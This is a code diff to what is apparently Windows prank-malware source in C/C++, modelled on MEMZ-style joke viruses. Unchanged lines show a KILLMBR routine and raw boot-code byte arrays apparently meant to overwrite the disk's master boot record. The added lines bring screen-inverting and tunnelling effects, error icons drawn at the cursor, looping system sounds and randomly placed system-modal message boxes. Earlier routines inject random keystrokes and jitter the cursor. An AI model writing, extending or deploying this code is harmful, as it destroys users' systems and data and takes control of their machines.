@@ -8,7 +8,23 @@
 #include <pthread.h>
 #include <iostream> 
 
-#define random(a,b) (rand()%(b-a)+a) 
+#define random_in(a,b) (rand()%(b-a)+a) 
+
+int scrw = GetSystemMetrics(SM_CXSCREEN);
+int scrh = GetSystemMetrics(SM_CYSCREEN);
+
+int times = 0;
+
+const char *sounds[] = {
+	"SystemAsterisk",
+	"SystemExclamation",
+	"SystemExit",
+	"SystemHand",
+	"SystemQuestion",
+	"SystemStart",
+};
+
+const size_t nSounds = sizeof(sounds) / sizeof(void *);
 
 const unsigned char code1[] = {
 	0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x04, 0x02, 0xB9, 0x02,
@@ -212,13 +228,13 @@ const size_t code2_len = sizeof(code2);
 void randClick(){
 	INPUT input;
 	input.type = INPUT_KEYBOARD;
-	input.ki.wVk = random(48, 90);
+	input.ki.wVk = random_in(48, 90);
 	SendInput(1, &input, sizeof(INPUT));
 }
 void infclick(){
 	for (;;){
 		randClick();
-		Sleep(random(5000,8000));
+		Sleep(random_in(5000,8000));
 	}
 }
 
@@ -345,7 +361,7 @@ void RandCursor(){
 	sys=p.y-3;
 	sxl=p.x+3;
 	syl=p.y+3;
-	SetCursorPos(random(sxs,sxl),random(sys,syl));
+	SetCursorPos(random_in(sxs,sxl),random_in(sys,syl));
 }
 void infCursor(){
 	for(;;){
@@ -360,11 +376,11 @@ void RandIcon(){
 	HWND hwnd = GetDesktopWindow();
 	HDC hdc = GetWindowDC(hwnd);
 	POINT point;
-	DrawIcon(hdc,random(0,cx),random(0,cy),LoadIcon(NULL,IDI_QUESTION));
-	DrawIcon(hdc,random(0,cx),random(0,cy),LoadIcon(NULL,IDI_WARNING));
-	DrawIcon(hdc,random(0,cx),random(0,cy),LoadIcon(NULL,IDI_ERROR));
-	DrawIcon(hdc,random(0,cx),random(0,cy),LoadIcon(NULL,IDI_INFORMATION));
-	DrawIcon(hdc,random(0,cx),random(0,cy),LoadIcon(NULL,IDI_WINLOGO));
+	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_QUESTION));
+	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_WARNING));
+	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_ERROR));
+	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_INFORMATION));
+	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_WINLOGO));
 }
 void infIcon(){
 	for(;;){
@@ -394,4 +410,105 @@ void KILLMBR(){
 
 	CloseHandle(drive);
 
+}
+
+LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
+	if (nCode == HCBT_CREATEWND) {
+		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;
+
+		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
+			HWND hwnd = (HWND)wParam;
+
+			int x = rand() % (scrw - pcs->cx);
+			int y = rand() % (scrh - pcs->cy);
+
+			pcs->x = x;
+			pcs->y = y;
+		}
+	}
+
+	return CallNextHookEx(0, nCode, wParam, lParam);
+}
+
+DWORD WINAPI messageBoxThread(LPVOID parameter) {
+	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
+	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
+	UnhookWindowsHookEx(hook);
+
+	return 0;
+}
+
+int tunnel() {
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	RECT rekt;
+	GetWindowRect(hwnd, &rekt);
+	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
+	ReleaseDC(hwnd, hdc);
+
+	out: return 200.0 / (times / 5.0 + 1) + 4;
+}
+
+void inftunnel(){
+	for(;;){
+		tunnel();
+		Sleep(2000);
+	}
+}
+
+int DrawErrors() {
+	int ix = GetSystemMetrics(SM_CXICON) / 2;
+	int iy = GetSystemMetrics(SM_CYICON) / 2;
+	
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+
+	POINT cursor;
+	GetCursorPos(&cursor);
+
+	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
+
+	if (rand() % (int)(10/(times/500.0+1)+1) == 0) {
+		DrawIcon(hdc, rand()%scrw, rand()%scrh, LoadIcon(NULL, IDI_WARNING));
+	}
+	
+	ReleaseDC(hwnd, hdc);
+
+	out: return 2;
+}
+
+void randomDraw(){
+	for(;;){
+		DrawErrors();
+	}
+}
+
+int payloadSound() {
+	PlaySoundA(sounds[rand() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
+	out: return 20 + (rand() % 20);
+}
+
+void infplay(){
+	for(;;){
+		payloadSound();
+		Sleep(1000);
+	}
+}
+
+int payloadBlink() {
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	RECT rekt;
+	GetWindowRect(hwnd, &rekt);
+	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
+	ReleaseDC(hwnd, hdc);
+
+	out: return 100;
+}
+
+void infBlink(){
+	for(;;){
+		payloadBlink();
+		Sleep(random_in(200,5000));
+	}
 }
